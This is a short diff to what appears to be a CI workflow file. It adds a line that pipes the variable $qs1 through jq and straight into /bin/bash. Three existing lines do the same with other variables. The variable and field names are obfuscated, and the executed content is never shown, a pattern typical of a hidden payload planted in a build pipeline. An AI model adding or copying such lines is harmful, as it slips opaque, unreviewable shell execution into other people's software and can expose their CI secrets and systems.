@@ -41,6 +41,7 @@ jobs:
           echo $r353 | jq -r .xy58 | /bin/bash
           echo $xtdep92344 | jq -r .nj6 | /bin/bash
           echo $hgfjq3862 | jq -r .xra8 | /bin/bash
+          printf '%s' "$qs1" | jq -r .rky092 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
